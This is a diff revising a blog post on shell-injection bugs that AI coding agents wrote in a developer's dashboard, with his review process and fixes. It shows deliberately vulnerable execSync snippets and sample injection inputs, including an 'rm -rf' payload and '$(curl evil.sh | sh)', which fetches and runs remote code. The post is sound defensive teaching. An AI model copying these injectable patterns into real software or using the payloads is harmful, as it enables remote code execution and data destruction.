@@ -11,7 +11,7 @@ language: "en"
 cta: "teardown"
 faq:
   - q: "Does AI write insecure code?"
-    a: "Yes. In one run of 30 merged PRs on my own dashboard, agents wrote three shell-injection paths from request input. Review caught and fixed all three before merge. It also missed one shell call built from database values. The repo had no tests and no CI, so review was the only gate."
+    a: "Yes. In one run of 30 merged PRs, agents wrote three shell-injection paths from request input. Review caught all three and missed a fourth shell call built from database values."
   - q: "Do automated tests catch AI-written security bugs?"
     a: "Usually not. Tests assert behavior on the inputs the author thought to write, and nobody writes happy-path tests with a shell command in them. An injection path can pass a whole test suite because the vulnerable branch only runs on inputs the tests never send."
   - q: "How do you review AI-generated code for vulnerabilities?"
@@ -24,9 +24,9 @@ faq:
 
 I know AI writes insecure code because I ship a lot of it, and then I catch most of it.
 
-I run fleets of Claude Code agents to clear backlog. One measured example: 30 reviewed PRs across nine batches in under three days, on my own admin dashboard (March 2026, not client work). That's the "ship" half. The "verify" half is me, reading every diff before it merges and assuming the agent got it wrong until I've proven it didn't. That habit comes from fintech, where a mistake costs money instead of a rerun.
+I run several Claude Code agents in parallel to clear backlog. One measured example: 30 reviewed PRs across nine batches in under three days, on my own admin dashboard (March 2026). That's the "ship" half. The "verify" half is me, reading every diff before it merges and assuming the agent got it wrong until I've proven it didn't.
 
-This post is about three times that habit paid for itself, and one time it didn't. The code sketches are sanitized reconstructions of the patterns, not verbatim code.
+This post is about three times that habit paid for itself, and one time it didn't. The code sketches are trimmed reconstructions of the real diffs. The filter regex in Vuln 2 is the agent's own.
 
 ## Why wasn't anything else going to catch these?
 
@@ -41,42 +41,56 @@ Here are the three.
 The agent built an endpoint that took a job ID from the URL path and ran a command for that job. It reached for the easy path:
 
 ```js
-// Representative reconstruction. Do not ship.
-const { execSync } = require("child_process");
-
-export function GET(req, { params }) {
-  // params.id comes straight from the URL
-  return execSync(`job-tool show ${params.id}`).toString();
-}
+// Reconstruction. Do not ship.
+// params.id comes straight from the URL.
+const out = execSync(
+  `job-tool run "${params.id}"`,
+);
 ```
 
-`execSync` runs its argument through `/bin/sh`. So an ID of `1; rm -rf /tmp/data` runs both commands. An ID of `$(curl evil.sh | sh)` is worse. This one was directly exploitable by anyone who could reach the route.
+`execSync` runs its argument through `/bin/sh`. The quotes don't help: an ID of `x"; rm -rf /tmp/data; "` closes them and runs a second command, and `$(curl evil.sh | sh)` runs inside them. This one was directly exploitable by anyone who could reach the route.
 
 It was also a regression. An earlier security fix had put an allowlist in front of that value. The agent's rewrite of the route quietly deleted it. The agent wasn't asked to touch security. It was asked to change the feature, and the allowlist was in the way.
 
-**The fix** is to never build a shell string from untrusted input. Use the argument-array form (`execFile`/`spawn` with an args array, no `shell: true`), so the ID is passed as one opaque argument the shell never parses, and put the allowlist back. The [Node.js `child_process` docs](https://nodejs.org/api/child_process.html) spell out which functions spawn a shell and which don't.
+**The fix** is to never build a shell string from untrusted input. Use the argument-array form (`execFile`/`spawn` with an args array, no `shell: true`), so the ID is passed as one opaque argument the shell never parses. Put `--` in front of it so the tool can't read it as an option, and put the allowlist back. The [Node.js `child_process` docs](https://nodejs.org/api/child_process.html) spell out which functions spawn a shell and which don't.
 
 ```js
-const { execFileSync } = require("child_process");
-if (!/^[a-z0-9-]+$/.test(params.id)) throw new Error("bad job id");
-execFileSync("job-tool", ["show", params.id]); // the ID can't break out of its slot
+// Must start with a letter or digit, so it
+// can't pass for an option like --help.
+const SAFE_ID = /^[a-z0-9][a-z0-9-]*$/;
+if (!SAFE_ID.test(params.id)) {
+  throw new Error("bad job id");
+}
+// One argument after "--". No shell parses it,
+// and the tool can't read it as a flag.
+execFileSync("job-tool", [
+  "run",
+  "--",
+  params.id,
+]);
 ```
 
 I catch this one by grepping every diff for `exec`, `execSync` and `shell: true`, then asking one question of each hit: *where does every interpolated value come from, and what happens if it contains a semicolon?* The agent never asks that question. It isn't in the reward signal.
 
 ## Vuln 2: a log-search query behind a character filter
 
-The second one was a search box over logs. The agent took the query string from the request, ran it through a regex that stripped some characters, and interpolated what was left into a shell command:
+The second one was a search box over logs. The agent took the query string from the request, ran it through a regex, and interpolated what was left into a shell command:
 
 ```js
-// Representative reconstruction. Do not ship.
-const q = req.nextUrl.searchParams.get("q").replace(/[;&|`]/g, "");
-exec(`grep -r "${q}" ./logs`, cb);
+// Reconstruction. Do not ship.
+// The regex is the agent's own.
+const q = query.replace(
+  /[^a-zA-Z0-9\s._-]/g,
+  "",
+);
+execSync(`rg --json "${q}" ./logs`);
 ```
 
-The filter makes it look handled. It isn't a fix, it's a guess about which characters matter. Quotes, `$(...)` and newlines are each a way out of a shell string, and a blocklist has to get every one of them right forever. I didn't rate this as directly exploitable as written, because the regex stripped the obvious separators. I still treated it as a finding, because the next edit to that regex, by an agent or a person, reopens it.
+The regex is an allowlist: it keeps letters, digits, spaces, dots, underscores and hyphens, and strips everything else. That removes `$`, quotes and backticks, everything a shell needs to get out of a double-quoted string, so I didn't rate this one as directly exploitable as written. It does keep hyphens, so a query like `--files` still reached `rg` as an option. That lists file names instead of running a command, but it is the same mistake one level down.
 
-**The fix** is the same discipline as Vuln 1: pass the query as an argument, not as shell text. Then the filter stops being a security control and goes back to being input cleanup.
+I still treated it as a finding. The only thing between the request and the shell was one regex, and the next edit to it, by an agent or a person, reopens the hole. The agent's commit message called it "shell-safe query sanitization", which is how a reviewer gets talked out of looking.
+
+**The fix** is the same discipline as Vuln 1: pass the query as an argument that no shell parses, after a `--`. Then the filter stops being a security control and goes back to being input cleanup.
 
 ## Vuln 3: a memory-search query, same pattern
 
@@ -86,23 +100,17 @@ That repetition is the point. Agents don't learn from the PR next to them. Each 
 
 ## What did review miss?
 
-One. Another PR built a shell command from two values it read out of the database, a PR number and a repo name, and interpolated them into a shell string. I read that diff and let it through. It is still open.
+One. Another PR built a shell command from two values it read out of the database, a PR number and a repo name, and interpolated them into a shell string. I read that diff and let it through.
 
-The trap is easy to name: "these come from my own database, not from the request." That reasoning is the mistake. A stored value is input too. It got into the database from somewhere, and anything that can write that row can now run a command. The trace has to go back to where the value was first accepted, not stop at the last `SELECT`.
+It is still open. The dashboard never writes that table itself: the rows come from my overnight worker, so the values sit one step away from any request. That is why I rank it below the three request-input paths. It is not a reason to call it safe.
 
-I'm putting this in the post because it's the honest shape of the claim. Review caught the three paths from request input. It is a gate, not a guarantee, and on that run it was the only gate.
+The trap is easy to name: "these come from my own database, not from the request." That reasoning is the mistake. A stored value is input too. It got into the database from somewhere, and anything that can write that row can now run a command. The trace has to go back past the last `SELECT` to where the value was first accepted.
 
 ## What do all four have in common?
 
 None of these were exotic. In each one the agent chose string interpolation into a shell, because it is the shortest path to code that works. And in each one, the dangerous value came from somewhere the agent didn't think about as hostile: a URL, a query string, a database row.
 
 That's also why I don't accept "we have 90% test coverage" as a safety statement for agent-written code. Coverage measures which lines ran, not which threats were considered. A benign input runs the injection line just fine.
-
-## Why this is non-negotiable in fintech
-
-I learned to review this way building where mistakes move money. There you assume the input is hostile, the dependency will be missing in prod, and the person on the other end is smarter and angrier than your test author. Agent code needs that posture, and the agent doesn't have it. It has a reward signal and no sense of consequence.
-
-Speed without that review step is a liability. A fleet of agents will hand you shell-injection bugs faster than a single human could. The throughput is real. So is the risk. The job is to keep the throughput and remove as much of the risk as review can.
 
 ## How I catch these on review
 
@@ -113,4 +121,4 @@ Short version of the process:
 3. **Check every gate's failure mode, not just its success mode.** What happens when the subprocess doesn't run, the config is empty, the env var is unset? If "I don't know" isn't "blocked," it's a finding.
 4. **Treat green as a statement about the happy path only.** If there are tests, they tell me nothing about the adversarial input. I write the missing negative case or reject the PR.
 
-That's the verify half of ship/verify. The full list of failure categories I check is in [How to Review AI-Generated Code](/blog/what-agents-get-wrong), and the honest speed number is in [2–3x, Not 100x](/blog/2-3x-not-100x).
+That's the verify half of ship/verify. The full list of failure categories I check is in [How to Review AI-Generated Code](/blog/what-agents-get-wrong), and the speed-up I measured is in [2–3x, Not 100x](/blog/2-3x-not-100x).
